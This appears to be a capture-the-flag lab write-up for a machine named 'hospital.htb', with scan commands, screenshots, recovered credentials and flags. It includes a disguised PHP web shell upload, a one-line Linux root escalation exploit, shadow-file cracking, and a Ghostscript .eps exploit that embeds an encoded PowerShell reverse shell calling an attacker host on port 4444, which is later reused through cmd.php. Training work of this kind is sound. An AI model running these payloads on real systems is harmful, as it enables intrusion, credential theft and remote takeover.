# Initial Recon

## Port Scans

### All Ports

```shell
sudo nmap -p- -T4 --min-rate 10000 -oA nmap/all 10.129.229.189
```

![[Pasted image 20240522224806.png]]

### Port Versions

```shell
sudo nmap -p22,53,88,135,139,389,443,445,464,593,636,1801,2103,2105,2107,2179,3268,3269,3389,5985,6404,6406,6407,6409,6615,6633,6647,8080,9389 -T4 --min-rate 10000 -sCV -O -oA nmap/versions 10.129.229.189
```

![[Pasted image 20240522225356.png]]

## Hosts

![[Pasted image 20240522225841.png]]

## Website Enumeration - Port 8080

![[Pasted image 20240522230159.png]]

```
Username: test
Password: test1234
```

![[Pasted image 20240522230324.png]]

![[Pasted image 20240522230344.png]]

![[Pasted image 20240522230405.png]]

#### Testing with a text file

![[Pasted image 20240522230636.png]]

![[Pasted image 20240522230650.png]]

### File Uploads

![[Pasted image 20240522230810.png]]

![[Pasted image 20240522230910.png]]

![[Pasted image 20240522230924.png]]


![[Pasted image 20240522231021.png]]

```shell
cp ~/http/cmd.php cmd.phar
echo 'AddType application/x-httpd-php .phar' > .htaccess
```

![[Pasted image 20240522231508.png]]

![[Pasted image 20240522231658.png]]

![[Pasted image 20240523112448.png]]


![[Pasted image 20240523112725.png]]

Use the p0wny-shell 

http://hospital.htb:8080/uploads/p0wny-shell.phar
Then we navigate 
![[Pasted image 20240523144008.png]]

![[Pasted image 20240523114655.png]]
## Website Enumeration - Port 443

![[Pasted image 20240522230111.png]]

![[Pasted image 20240522230121.png]]

# Foothold

![[Pasted image 20240523120751.png]]


```shell
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
```

> Resource: https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629/blob/main/exploit.sh

![[Pasted image 20240523123321.png]]

```
www-data@webserver:/var/www/html/uploads$ ls
gameoverlay.txt
www-data@webserver:/var/www/html/uploads$ cat gameoverlay.txt > exploit.sh
www-data@webserver:/var/www/html/uploads$ ls
exploit.sh  gameoverlay.txt
www-data@webserver:/var/www/html/uploads$ chmod +x exploit.sh 
www-data@webserver:/var/www/html/uploads$ .\exploit.sh
.exploit.sh: command not found
www-data@webserver:/var/www/html/uploads$ ./exploit.sh
root@webserver:/var/www/html/uploads# whoami
root
root@webserver:/var/www/html/uploads# ^C
root@webserver:/var/www/html/uploads# 
```

![[Pasted image 20240523123653.png]]

```shell
cat /etc/shadow
```

![[Pasted image 20240523123759.png]]


```shell
john --wordlist=/usr/share/wordlists/rockyou.txt shadow
```

![[Pasted image 20240523124353.png]]

## Authenticated Enumeration

### SMB Authenticated Enumeration - Port 445

![[Pasted image 20240523124708.png]]
## Password Attack on the HTTPS Webapp

![[Pasted image 20240523124826.png]]

Login is successful.

![[Pasted image 20240523124903.png]]


![[Pasted image 20240523124923.png]]

Chris Brown is expecting a file to be sent to them. Search for the exploit using key words from the email.

```
.eps exploit site:github.com
```

![[Pasted image 20240523125546.png]]
Using https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection , we can use the repo instructions to generate a malicious payload.

```shell
git clone https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection

cd CVE-2023-36664-Ghostscript-command-injection
```

![[Pasted image 20240523125857.png]]

```shell
python ./CVE_2023_36664_exploit.py --inject --filename file.eps --payload "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANAA1ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
```

The payload code should now be in the `file.eps` file.

```shell
cat file.eps
```

![[Pasted image 20240523130337.png]]


![[Pasted image 20240523130646.png]]

Wait until the user opens the file up, you will receive a reverse shell on the listener on the attack machine.

![[Pasted image 20240523130738.png]]

![[Pasted image 20240523131000.png]]

User flag:

```
f38a9cffebbe52944253fa30d6977643
```


## Privilege Escalation

Observe the user's file directory and read `ghostscript.bat` to reveal credentials:

```powershell
type ghostscript.bat
```

![[Pasted image 20240523131357.png]]

Get a more stable shell using `evil-winrn` with the new credentials:

```shell
evil-winrm -i hospital.htb -u drbrown -p 'chr!$br0wn'
```

![[Pasted image 20240523131949.png]]

Hitting the help icon on the lower

![[Pasted image 20240523132515.png]]


![[Pasted image 20240523133726.png]]

Navigate to our file on the https site `https://hospital.htb/cmd.php?cmd=whoami` to confirm our access.

```
https://hospital.htb/cmd.php?cmd=whoami
```

![[Pasted image 20240523133754.png]]

![[Pasted image 20240523134720.png]]

We can reuse our previous PowerShell payload to create another reverse shell on port 4444:

```
https://hospital.htb/cmd.php?cmd=powershell%20-e%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANAA1ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
```

![[Pasted image 20240523134846.png]]

![[Pasted image 20240523134909.png]]

Confirm root flag:

```powershell
type \users\administrator\desktop\root.txt
ipconfig
whoami /all
```

![[Pasted image 20240523135057.png]]

```
be5b264ea314de41f50a682bcf02060b
```